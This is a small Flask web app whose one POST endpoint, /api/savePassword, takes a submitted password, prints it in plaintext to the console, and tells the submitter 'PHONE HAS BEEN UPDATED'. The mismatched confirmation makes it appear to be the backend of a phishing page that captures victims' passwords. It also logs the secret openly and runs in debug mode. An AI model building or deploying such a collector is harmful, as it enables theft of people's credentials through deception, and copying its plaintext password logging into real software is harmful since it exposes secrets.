from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/savePassword', methods=['POST'])
def save_password():
    password = request.form.get('password')
    if password:
        try:
            # Print the password to the console
            print(f"Received password: {password}")
            return jsonify({'message': 'PHONE HAS BEEN UPDATED'})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    else:
        return jsonify({'error': 'No password provided'}), 400

if __name__ == '__main__':
    app.run(debug=True)
